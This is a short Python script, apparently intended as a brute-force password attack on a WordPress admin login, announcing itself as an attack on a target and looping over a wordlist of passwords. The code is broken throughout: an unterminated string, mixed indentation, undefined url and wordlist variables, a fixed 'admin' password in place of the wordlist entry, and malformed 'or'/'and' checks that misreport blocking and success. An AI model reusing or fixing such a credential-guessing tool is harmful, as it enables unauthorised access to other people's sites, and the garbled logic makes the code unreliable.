import requests
import threading
import sys

pwd = "0"

cookies = {
    'wordpress_test_cookie': 'WP+Cookie+check',
}

headers = {
    'User-Agent': 'Mozilla/5.0
}

def Brute():
    print()
    print("[*] Started Brute Force Attack On Target")
    print("[+] Attacking")

    passwords = [x.strip() for x in open(wordlist, 'r', encoding='latin-1').readlines() if x]
    
    for password in passwords:
        data = {
	  'log': 'admin',
	  'pwd': 'admin',
        }

        number = '0'
        number += '1'
        print("[*] Trying Password#" + number + ": " + password)

	response = requests.post(url, headers=headers, cookies=cookies, data=data)

        if "firewall" or "blocked" or "banned" or "Unauthenticated" or "robot" in response.text:
            print("[-] Your IP Has Been Blocked By The Firewall")
            sys.exit()
        
        if "The password you entered for the username" and "Unauthorized Access" and "firewall" and "blocked" and "banned" and "unauthenticated" and "robot" not in response.text:
            print()
            print("[+] Password Found: " + password)
            pwd = "1"
            sys.exit()
try:
    thread = threading.Thread(target=Brute)
    thread.start()
    thread.join()

except KeyboardInterrupt:
    print("[-] Aborted")
    sys.exit()


if pwd == "0":
    print("[-] Password Not Found")
    sys.exit()
